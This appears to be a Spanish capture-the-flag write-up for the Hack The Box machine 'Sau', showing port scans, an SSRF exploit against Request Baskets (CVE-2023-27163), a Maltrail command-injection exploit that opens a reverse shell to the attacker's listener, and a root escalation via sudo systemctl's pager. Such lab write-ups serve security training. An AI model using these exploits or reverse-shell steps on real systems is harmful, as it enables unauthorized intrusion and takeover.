@@ -1,0 +1,354 @@
+---
+icon: desktop
+layout:
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
+---
+
+# Sau
+
+`Sau` es una máquina Linux de dificultad fácil que cuenta con una instancia de `Request Baskets` que es vulnerable a la falsificación de solicitudes del lado del servidor (SSRF) a través de `[CVE-2023-27163]`([https://nvd.nist.gov/vuln/detail/CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)). Aprovechando la vulnerabilidad, podemos obtener acceso a una instancia de `Maltrail` que es vulnerable a la inyección de comandos del sistema operativo no autenticados, lo que nos permite obtener un shell inverso en la máquina como `puma`. Luego, se explota una configuración incorrecta de `sudo` para obtener un shell `root`.
+
+<figure><img src="../../.gitbook/assets/Sau.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+
+
+
+
+```bash
+❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.224 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 22:58 CET
+Initiating SYN Stealth Scan at 22:58
+Scanning 10.10.11.224 [65535 ports]
+Discovered open port 22/tcp on 10.10.11.224
+Discovered open port 55555/tcp on 10.10.11.224
+Completed SYN Stealth Scan at 22:59, 19.93s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.224
+Host is up, received user-set (0.069s latency).
+Scanned at 2025-01-26 22:58:56 CET for 20s
+Not shown: 65531 closed tcp ports (reset), 2 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE REASON
+22/tcp    open  ssh     syn-ack ttl 63
+55555/tcp open  unknown syn-ack ttl 63
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 20.07 seconds
+           Raw packets sent: 65575 (2.885MB) | Rcvd: 65580 (2.624MB)
+```
+
+
+
+```bash
+❯ extractPorts allPorts
+
+[*] Extracting information...
+
+	[*] IP Address: 10.10.11.224
+	[*] Open ports: 22,55555
+
+[*] Ports copied to clipboard
+```
+
+
+
+```bash
+❯ nmap -sCV -p22,55555 10.10.11.224 -A -oN targeted -oX targetedXML
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 22:59 CET
+Nmap scan report for 10.10.11.224
+Host is up (0.072s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
+|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
+|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
+55555/tcp open  http    Golang net/http server
+| http-title: Request Baskets
+|_Requested resource was /web
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Sun, 26 Jan 2025 22:00:21 GMT
+|     Content-Length: 75
+|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
+|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 302 Found
+|     Content-Type: text/html; charset=utf-8
+|     Location: /web
+|     Date: Sun, 26 Jan 2025 22:00:04 GMT
+|     Content-Length: 27
+|     href="/web">Found</a>.
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Allow: GET, OPTIONS
+|     Date: Sun, 26 Jan 2025 22:00:04 GMT
+|     Content-Length: 0
+|   OfficeScan: 
+|     HTTP/1.1 400 Bad Request: missing required Host header
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|_    Request: missing required Host header
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port55555-TCP:V=7.95%I=7%D=1/26%Time=6796B05F%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
+SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Sun,\x2026\x20Jan\x20
+SF:2025\x2022:00:04\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
+SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
+SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
+SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Sun,\x2026\x20Jan\x20
+SF:2025\x2022:00:04\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
+SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
+SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
+SF:r\n400\x20Bad\x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20
+SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Co
+SF:ntent-Type-Options:\x20nosniff\r\nDate:\x20Sun,\x2026\x20Jan\x202025\x2
+SF:022:00:21\x20GMT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20n
+SF:ame;\x20the\x20name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\
+SF:-_\\\.\]{1,250}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
+SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
+SF:ose\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x2
+SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
+SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1
+SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
+SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan
+SF:,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host
+SF:\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
+SF:on:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Ho
+SF:st\x20header");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT      ADDRESS
+1   90.36 ms 10.10.16.1
+2   31.31 ms 10.10.11.224
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.82 seconds
+```
+
+
+
+
+
+```bash
+❯ xsltproc targetedXML > index.html
+
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+
+
+<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
+
+
+
+```bash
+❯ curl -s -X GET http://10.10.11.224:55555/l67yrgc
+```
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+
+
+<figure><img src="../../.gitbook/assets/4171_vmware_fG2KpvnjwN.png" alt=""><figcaption></figcaption></figure>
+
+
+
+```bash
+❯ curl -s -X GET http://10.10.11.224:55555/l67yrgc
+
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.224 - - [26/Jan/2025 23:15:56] code 404, message File not found
+10.10.11.224 - - [26/Jan/2025 23:15:56] "GET /test HTTP/1.1" 404 -
+```
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>
+
+
+
+{% embed url="https://github.com/entr0pie/CVE-2023-27163" %}
+
+<pre class="language-bash"><code class="lang-bash"><strong>❯ wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh
+</strong>--2025-01-26 23:26:20--  https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh
+Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
+Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.111.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 1669 (1,6K) [text/plain]
+Grabando a: «CVE-2023-27163.sh»
+
+CVE-2023-27163.sh                                         100%[==================================================================================================================================>]   1,63K  --.-KB/s    en 0s      
+
+2025-01-26 23:26:21 (4,54 MB/s) - «CVE-2023-27163.sh» guardado [1669/1669]
+
+❯ chmod +x CVE-2023-27163.sh
+
+</code></pre>
+
+
+
+```bash
+❯ ./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80
+Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163
+
+> Creating the "xaqqjw" proxy basket...
+> Basket created!
+> Accessing http://10.10.11.224:55555/xaqqjw now makes the server request to http://127.0.0.1:80.
+> Authorization: Ny3T46IMJU35s4oGuVDXT4yrFdQ7h-CxrBgWGvsu0pXB
+```
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+{% embed url="https://github.com/spookier/Maltrail-v0.53-Exploit" %}
+
+
+
+```bash
+❯ git clone https://github.com/spookier/Maltrail-v0.53-Exploit; cd Maltrail-v0.53-Exploit
+Clonando en 'Maltrail-v0.53-Exploit'...
+remote: Enumerating objects: 17, done.
+remote: Counting objects: 100% (17/17), done.
+remote: Compressing objects: 100% (12/12), done.
+remote: Total 17 (delta 4), reused 9 (delta 3), pack-reused 0 (from 0)
+Recibiendo objetos: 100% (17/17), 4.44 KiB | 2.22 MiB/s, listo.
+Resolviendo deltas: 100% (4/4), listo.
+```
+
+
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+```
+
+
+
+```bash
+❯ python3 exploit.py 10.10.16.5 443 http://10.10.11.224:55555/l67yrgc
+Running exploit on http://10.10.11.224:55555/l67yrgc/login
+```
+
+
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.11.224] 41424
+$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+puma@sau:/opt/maltrail$ cat /home/puma/user.txt
+cat /home/puma/user.txt
+a7e0ab0a8************************
+```
+
+
+
+```bash
+puma@sau:/opt/maltrail$ sudo -l
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+
+
+
+```bash
+puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
+● trail.service - Maltrail. Server of malicious traffic detection system
+     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
+     Active: active (running) since Sun 2025-01-26 21:09:34 UTC; 1h 21min ago
+       Docs: https://github.com/stamparm/maltrail#readme
+             https://github.com/stamparm/maltrail/wiki
+   Main PID: 899 (python3)
+      Tasks: 12 (limit: 4662)
+     Memory: 32.1M
+     CGroup: /system.slice/trail.service
+             ├─ 899 /usr/bin/python3 server.py
+             ├─1247 /bin/sh -c logger -p auth.info -t "maltrail[899]" "Failed p>
+             ├─1252 /bin/sh -c logger -p auth.info -t "maltrail[899]" "Failed p>
+             ├─1256 sh
+             ├─1258 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
+             ├─1259 /bin/sh
+             ├─1260 script /dev/null -c bash
+             ├─1261 bash
+             ├─1298 sudo /usr/bin/systemctl status trail.service
+             ├─1299 /usr/bin/systemctl status trail.service
+             └─1301 pager
+
+Jan 26 21:09:34 sau systemd[1]: Started Maltrail. Server of malicious traffic d>
+Jan 26 22:30:18 sau sudo[1297]:     puma : TTY=pts/1 ; PWD=/opt/maltrail ; USER>
+!bash
+root@sau:/opt/maltrail# whoami
+root
+root@sau:/opt/maltrail# cat /root/root.txt
+5275ac8db31*********************
+```
